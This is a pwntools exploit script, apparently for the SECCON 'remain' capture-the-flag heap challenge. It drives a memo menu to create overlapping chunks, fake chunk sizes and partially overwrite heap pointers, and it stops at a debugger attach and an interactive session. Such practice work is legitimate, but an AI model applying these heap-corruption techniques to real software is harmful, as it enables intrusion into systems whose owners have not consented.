from pwn import *

s=process("./remain")
#s=remote("remain.chal.seccon.jp", 27384)

def add(data):
    s.sendlineafter("> ", str(1))
    s.sendlineafter("Input memo > ", str(data))

def edit(idx, data):
    s.sendlineafter("> ", str(2))
    s.sendlineafter("Input id > ", str(idx))
    s.sendafter("Input new memo > ", str(data))

def free(idx):
    s.sendlineafter("> ", str(3))
    s.sendlineafter("Input id > ", str(idx))

"""
# allocate overlapping chunk
add("a"*0x20 + p64(0) + p64(0x51))
add("a"*0x20 + p64(0) + p64(0x21))
add("a"*0x40)
add("a"*0x38 + p64(0x21))
add("b"*8 + p64(0x21) + "a"*0x30)
free(0)
free(1)
edit(1,p8(0xf0))
add("a"*0x40)
add("a"*0x08 + p64(0x51))
free(2)
edit(6,"a"*0x8 + "\x91")
free(2)
add(p64(0)*2)
free(2)
"""

add("a"*0x20 + p64(0) + p64(0x51))
add("a"*0x20 + p64(0) + p64(0x21))
free(0)
free(1)
edit(1,p16(0x7000))
add("a"*0x40)
add(p64(0) + p64(0x251) + p64(0x0700000000000000))

free(0)
free(1)
edit(1,p8(0x50))
add("a"*0x40)
add("b"*0x8 + p64(0x51))
add("a"*0x40)
free(0)
edit(5,"a"*0x8 + "\xa1")
free(0)

gdb.attach(s)





s.interactive()
